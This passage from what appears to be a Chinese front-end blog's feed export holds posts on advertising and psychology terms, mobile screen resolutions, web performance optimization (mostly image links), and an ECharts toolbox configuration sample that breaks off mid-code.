</p><ul><li>指强者愈强、弱者愈弱、好的愈好，坏的愈坏，多的愈多，少的愈少的现象，广泛应用于社会心理学、教育、金融以及科学等众多领域。</li></ul><p><strong>羊群效应</strong></p><ul><li>指人们经常受到多数人影响，从而跟从大众的思想或行为，也被称为“从众效应”。人们会追随大众所同意的，将自己的意见默认否定，且不会主观上思考事件的意义。羊群效应是诉诸群众谬误的基础</li></ul><p><strong>霍桑效应</strong></p><ul><li>指那些意识到自己正在被别人观察的个人具有改变自己行为的倾向</li></ul><p><strong>病毒式营销</strong></p><ul><li>源于英文词汇viralmarketing。常用于进行网站推广、品牌推广等。利用的是用户口碑传播的原理，在互联网上，这种“口碑传播”更为方便，可以像病毒一样迅速蔓延，因此病毒性营销成为一种高效的信息传播方式，而且，由于这种传播是用户之间自发进行的，因此几乎是不需要费用的网络营销手段。</li></ul><p><strong>斯德哥尔摩综合征</strong></p><ul><li>指犯罪的被害者对于犯罪者产生情感，甚至反过来帮助犯罪者的一种情结。这个情感造成被害人对加害人产生好感、依赖心、甚至协助加害人。人质会对劫持者产生一种心理上的依赖感。他们的生死操控在劫持者手里，劫持者让他们活下来，他们便不胜感激。他们与劫持者共命运，把劫持者的前途当成自己的前途，把劫持者的安危视为自己的安危。于是，他们采取了“我们反对他们”的态度，把解救者当成了敌人</li></ul><p><strong>长尾理论</strong> </p><ul><li>网络时代兴起的一种新理论，由于成本和效率的因素，当商品储存流通展示的场地和渠道足够宽广，商品生产成本急剧下降以至于个人都可以进行生产，并且商品的销售成本急剧降低时，几乎任何以前看似需求极低的产品，只要有卖，都会有人买。这些需求和销量不高的产品所占据的共同市场份额，可以和主流产品的市场份额相比，甚至更大</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、平台&quot;&gt;&lt;a href=&quot;#一、平台&quot; class=&quot;headerlink&quot; title=&quot;一、平台&quot;&gt;&lt;/a&gt;一、平台&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;DSP&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;DSP&lt;/code&gt;广告简单来
      
    
    </summary>
    
      <category term="Ad" scheme="http://blog.poetries.top/categories/Ad/"/>
    
    
      <category term="广告术语" scheme="http://blog.poetries.top/tags/%E5%B9%BF%E5%91%8A%E6%9C%AF%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>移动设备分辨率预览</title>
    <link href="http://blog.poetries.top/2018/01/27/mobile-device-size/"/>
    <id>http://blog.poetries.top/2018/01/27/mobile-device-size/</id>
    <published>2018-01-27T13:20:43.000Z</published>
    <updated>2018-04-10T03:33:13.991Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>来源 <a href="https://www.paintcodeapp.com/news/ultimate-guide-to-iphone-resolutions" target="_blank" rel="noopener">https://www.paintcodeapp.com/news/ultimate-guide-to-iphone-resolutions</a></p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-006d909cb0d4729c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;来源 &lt;a href=&quot;https://www.paintcodeapp.com/news/ultimate-guide-to-iphone-resolutions&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://w
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="移动端" scheme="http://blog.poetries.top/tags/%E7%A7%BB%E5%8A%A8%E7%AB%AF/"/>
    
      <category term="适配" scheme="http://blog.poetries.top/tags/%E9%80%82%E9%85%8D/"/>
    
  </entry>
  
  <entry>
    <title>图解前端性能优化</title>
    <link href="http://blog.poetries.top/2018/01/12/fed-performance-optimization/"/>
    <id>http://blog.poetries.top/2018/01/12/fed-performance-optimization/</id>
    <published>2018-01-12T03:24:03.000Z</published>
    <updated>2018-04-10T03:33:13.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、css和js的装载与执行"><a href="#一、css和js的装载与执行" class="headerlink" title="一、css和js的装载与执行"></a>一、css和js的装载与执行</h2><h3 id="1-1-HTML-页面加载渲染的过程"><a href="#1-1-HTML-页面加载渲染的过程" class="headerlink" title="1.1 HTML 页面加载渲染的过程"></a>1.1 HTML 页面加载渲染的过程</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-db7c77d1567a95cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="1-2-HTML渲染过程的一些特点"><a href="#1-2-HTML渲染过程的一些特点" class="headerlink" title="1.2 HTML渲染过程的一些特点"></a>1.2 HTML渲染过程的一些特点</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-e1e6feedcc2fdb1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="1-3-css-阻塞和-js-阻塞"><a href="#1-3-css-阻塞和-js-阻塞" class="headerlink" title="1.3 css 阻塞和 js 阻塞"></a>1.3 css 阻塞和 js 阻塞</h3><h4 id="1-3-1-CSS阻塞"><a href="#1-3-1-CSS阻塞" class="headerlink" title="1.3.1 CSS阻塞"></a>1.3.1 CSS阻塞</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-508aa2aef18de2b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="1-3-2-JS阻塞"><a href="#1-3-2-JS阻塞" class="headerlink" title="1.3.2 JS阻塞"></a>1.3.2 JS阻塞</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-d43c8d6cc854ba71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="二、资源的压缩与合并"><a href="#二、资源的压缩与合并" class="headerlink" title="二、资源的压缩与合并"></a>二、资源的压缩与合并</h2><h3 id="2-1-文件合并"><a href="#2-1-文件合并" class="headerlink" title="2.1 文件合并"></a>2.1 文件合并</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-bf9c0905ae7544a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="2-2-css、js-及-HTML压缩"><a href="#2-2-css、js-及-HTML压缩" class="headerlink" title="2.2 css、js 及 HTML压缩"></a>2.2 css、js 及 HTML压缩</h3><h4 id="2-2-1-CSS压缩"><a href="#2-2-1-CSS压缩" class="headerlink" title="2.2.1 CSS压缩"></a>2.2.1 CSS压缩</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-b7e0b78856dd41ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="2-2-2-JS压缩"><a href="#2-2-2-JS压缩" class="headerlink" title="2.2.2 JS压缩"></a>2.2.2 JS压缩</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-28bca2afc251aaad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="2-2-3-HTML压缩"><a href="#2-2-3-HTML压缩" class="headerlink" title="2.2.3 HTML压缩"></a>2.2.3 HTML压缩</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-6216398956a2b443.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="2-3-http-清求的过程及潜在的性能优化点"><a href="#2-3-http-清求的过程及潜在的性能优化点" class="headerlink" title="2.3 http 清求的过程及潜在的性能优化点"></a>2.3 http 清求的过程及潜在的性能优化点</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-42ba978daacbdbfd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/1480597-c228e0f7ea3026a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="三、图片相关的优化"><a href="#三、图片相关的优化" class="headerlink" title="三、图片相关的优化"></a>三、图片相关的优化</h2><h3 id="3-1-不同格式图片常用的业务场景"><a href="#3-1-不同格式图片常用的业务场景" class="headerlink" title="3.1 不同格式图片常用的业务场景"></a>3.1 不同格式图片常用的业务场景</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-bb112b24d483508f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="3-2-图片压缩几种方法-雪碧图、Image-inline"><a href="#3-2-图片压缩几种方法-雪碧图、Image-inline" class="headerlink" title="3.2 图片压缩几种方法-雪碧图、Image inline"></a>3.2 图片压缩几种方法-雪碧图、Image inline</h3><h4 id="3-2-1-使用矢量图"><a href="#3-2-1-使用矢量图" class="headerlink" title="3.2.1 使用矢量图"></a>3.2.1 使用矢量图</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-7268251dc26df726.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="3-2-2-在安卓下使用webp"><a href="#3-2-2-在安卓下使用webp" class="headerlink" title="3.2.2 在安卓下使用webp"></a>3.2.2 在安卓下使用webp</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-a2efc91b021b0908.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="四、-懒加载与预加载"><a href="#四、-懒加载与预加载" class="headerlink" title="四、 懒加载与预加载"></a>四、 懒加载与预加载</h2><h3 id="4-1-懒加载原理"><a href="#4-1-懒加载原理" class="headerlink" title="4.1 懒加载原理"></a>4.1 懒加载原理</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-e224d3c1b30b1166.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="4-2-预加载原理"><a href="#4-2-预加载原理" class="headerlink" title="4.2 预加载原理"></a>4.2 预加载原理</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-15d023ecf8135497.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="4-3-懒加载、预加载使用场景"><a href="#4-3-懒加载、预加载使用场景" class="headerlink" title="4.3 懒加载、预加载使用场景"></a>4.3 懒加载、预加载使用场景</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-32e8e5e65e22520d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-cfb25a3e684a3f63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-909720cb7fba2464.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-d4d97036deeca145.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="4-4-预加载原生-js-和-PreloadJS-实现"><a href="#4-4-预加载原生-js-和-PreloadJS-实现" class="headerlink" title="4.4 预加载原生 js 和 PreloadJS 实现"></a>4.4 预加载原生 js 和 PreloadJS 实现</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-70497a61965504c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-d9032f68dce4346a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="五、缓存"><a href="#五、缓存" class="headerlink" title="五、缓存"></a>五、缓存</h2><p><img src="http://upload-images.jianshu.io/upload_images/1480597-d7d9edfaf5aa7579.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-1dbc343a9ec775eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-366777492f307674.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-39b360c7512a00a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-0ace88d37f29a1ff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-aaea0d655b517f8c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-ded1efe433d4c007.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-0cc71bee891f5d44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-abe977f4a60605b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-657b9b61ba419d9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-a47a8e5fb1099791.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-1b339df2c203a1fe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="六、重绘与回流"><a href="#六、重绘与回流" class="headerlink" title="六、重绘与回流"></a>六、重绘与回流</h2><h3 id="6-1-什么是重绘与回流"><a href="#6-1-什么是重绘与回流" class="headerlink" title="6.1 什么是重绘与回流"></a>6.1 什么是重绘与回流</h3><h4 id="6-1-1-重绘"><a href="#6-1-1-重绘" class="headerlink" title="6.1.1 重绘"></a>6.1.1 重绘</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-83af5a7aaf32ad70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="6-1-2-回流"><a href="#6-1-2-回流" class="headerlink" title="6.1.2 回流"></a>6.1.2 回流</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-4bddd29e462cc371.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/1480597-76cf21bf4a432931.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="6-2-避免重绘回流的两种方法"><a href="#6-2-避免重绘回流的两种方法" class="headerlink" title="6.2 避免重绘回流的两种方法"></a>6.2 避免重绘回流的两种方法</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-4b5d315909066dd8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-f05cb8a0cc10c2a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-923dc6a9637d50dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-1c752f8cc61cd4ff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="6-3-css-性能让-Javacript-变慢？"><a href="#6-3-css-性能让-Javacript-变慢？" class="headerlink" title="6.3 css 性能让 Javacript 变慢？"></a>6.3 css 性能让 Javacript 变慢？</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-cea456689dc81a54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="6-4-案例解析-重绘、回流及图层"><a href="#6-4-案例解析-重绘、回流及图层" class="headerlink" title="6.4 案例解析-重绘、回流及图层"></a>6.4 案例解析-重绘、回流及图层</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-04085f94a1992a54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-a08ea0e9ad2ab135.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-16e25f3c65f2d858.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-d8046867832235a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-4a868eef59433cc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-14b4d57b2f9a2f78.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-8b044762ba6ed086.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="6-5-实战优化点总结"><a href="#6-5-实战优化点总结" class="headerlink" title="6.5 实战优化点总结"></a>6.5 实战优化点总结</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-897fa5f8ec6a24d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="七、浏览器存储"><a href="#七、浏览器存储" class="headerlink" title="七、浏览器存储"></a>七、浏览器存储</h2><h3 id="7-1-cookies"><a href="#7-1-cookies" class="headerlink" title="7.1 cookies"></a>7.1 cookies</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-dd1a4cbc59e979dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-754f247c65ebb613.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-eef80297b5c5a12c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-fe67b7381cd4f871.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-d098205326c03acf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-0e54d54b577be81d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-317dd9d7b61a0659.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="7-2-LocalStorage、SessionStorage"><a href="#7-2-LocalStorage、SessionStorage" class="headerlink" title="7.2 LocalStorage、SessionStorage"></a>7.2 LocalStorage、SessionStorage</h3><h4 id="7-2-1-LocalStorage"><a href="#7-2-1-LocalStorage" class="headerlink" title="7.2.1 LocalStorage"></a>7.2.1 LocalStorage</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-6c8d497e2ba18890.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="7-2-2-SessionStorage"><a href="#7-2-2-SessionStorage" class="headerlink" title="7.2.2 SessionStorage"></a>7.2.2 SessionStorage</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-3aa67b0c1d03ae03.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="7-3-IndexedDB"><a href="#7-3-IndexedDB" class="headerlink" title="7.3 IndexedDB"></a>7.3 IndexedDB</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-4be5537b37c85261.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="7-4-案例解析"><a href="#7-4-案例解析" class="headerlink" title="7.4 案例解析"></a>7.4 案例解析</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-948146becfc107ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-beaec4315a195788.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-1ad8d12033872186.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="7-5-PWA与Service-Workers"><a href="#7-5-PWA与Service-Workers" class="headerlink" title="7.5 PWA与Service Workers"></a>7.5 PWA与Service Workers</h3><h4 id="7-5-1-PWA"><a href="#7-5-1-PWA" class="headerlink" title="7.5.1 PWA"></a>7.5.1 PWA</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-85ab5759c2779ef9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="7-5-2-Service-Workers"><a href="#7-5-2-Service-Workers" class="headerlink" title="7.5.2 Service Workers"></a>7.5.2 Service Workers</h4><p><img src="http://upload-images.jianshu.io/upload_images/1480597-7b6fa17f0d752474.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-54c4d665cb592c7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-1aae704c7a32cfd4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="7-6-Service-Workers-离线应用"><a href="#7-6-Service-Workers-离线应用" class="headerlink" title="7.6 Service Workers-离线应用"></a>7.6 Service Workers-离线应用</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-af1c1d5a7359e24b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/1480597-fcff980c6603351b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="八、移动H5前端性能优化指南"><a href="#八、移动H5前端性能优化指南" class="headerlink" title="八、移动H5前端性能优化指南"></a>八、移动H5前端性能优化指南</h2><p><img src="https://camo.githubusercontent.com/db045941b5adebe26eae1202b9286fe8c39e5fa2/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f3934383631342d313735326635633839393363633161302e6a7065673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、css和js的装载与执行&quot;&gt;&lt;a href=&quot;#一、css和js的装载与执行&quot; class=&quot;headerlink&quot; title=&quot;一、css和js的装载与执行&quot;&gt;&lt;/a&gt;一、css和js的装载与执行&lt;/h2&gt;&lt;h3 id=&quot;1-1-HTML-页面加载渲染的过
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="性能优化" scheme="http://blog.poetries.top/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>echart使用小结</title>
    <link href="http://blog.poetries.top/2018/01/12/echart/"/>
    <id>http://blog.poetries.top/2018/01/12/echart/</id>
    <published>2018-01-12T02:05:43.000Z</published>
    <updated>2018-04-10T03:33:13.971Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>十一个组件选项主要用来进行交互</p></blockquote><h2 id="一、Timeline选项"><a href="#一、Timeline选项" class="headerlink" title="一、Timeline选项"></a>一、Timeline选项</h2><ul><li>时间轴，每个图表最多仅有一个时间轴控件</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-6a02bd853069b904.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="二、Title选项"><a href="#二、Title选项" class="headerlink" title="二、Title选项"></a>二、Title选项</h2><ul><li>每个图表最多仅有一个标题控件，每个标题控件可设主副标题</li></ul><blockquote><p>可以对标题文字的大小样式进行设置</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-aeae6a9ace95a4aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="三、toolbox"><a href="#三、toolbox" class="headerlink" title="三、toolbox"></a>三、toolbox</h2><ul><li>工具箱，每个图表最多仅有一个工具箱。工具箱里面可以实现图表类型的切换，保存图片，刷新，查看数据等功能。可以对其像素进行设置</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-dcc780629ce8ad78.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    mark : &#123;</span><br><span class="line"></span><br><span class="line">        show : <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">        title : &#123;</span><br><span class="line"></span><br><span class="line">            mark : <span class="string">'辅助线开关'</span>,</span><br><span class="line"></span><br><span class="line">            markUndo : <span class="string">'删除辅助线'</span>,</span><br><span class="line"></span><br><span class="line">            markClear : <span class="string">'清空辅助线'</span></span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        lineStyle : &#123;</span><br><span class="line"></span><br><span class="line">            width : <span class="number">2</span>,</span><br><span class="line"></span><br><span class="line">            color : <span class="string">'#1e90ff'</span>,</span><br><span class="line"></span><br><span class="line">            type : <span class="string">'dashed'</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    dataZoom : &#123;</span><br><span class="line"></span><br><span class="line">        show : <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">        title : &#123;</span><br><span class="line"></span><br><span class="line">            dataZoom : <span class="string">'区域缩放'</span>,</span><br><span class="line"></span><br><span class="line">            dataZoomReset : <span class="string">'区域缩放后退'</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    dataView : &#123;</span><br><span class="line"></span><br><span class="line">        show : <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">        title : <span class="string">'数据视图'</span>,</span><br><span class="line"></span><br><span class="line">        readOnly: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">        lang: [<span class="string">'数据视图'</span>, <span class="string">'关闭'</span>, <span class="string">'刷新'</span>]</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    magicType: &#123;</span><br><span class="line"></span><br><span class="line">        show : <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">        title : &#123;</span><br><span class="line"></span><br><span class="line">            line : <span class="string">'折线图切换'</span>,</span><br><span class="line"></span><br><span class="line">            bar : <span class="string">'柱形图切换'</span>,</span><br><span class="line"></span><br><span class="line">            stack : <span class="string">'堆积'</span>,</span><br><span class="line"></span><br><span class="line">            tiled : <span class="string">'平铺'</span>,</span><br><span class="line"></span><br><span class="line">            force: <span class="string">'力导向布局图切换'</span>,</span><br><span class="line"></span><br><span class="line">            chord: <span class="string">'和弦图切换'</span>,</span><br><span class="line"></span><br><span class="line">            pie: <span 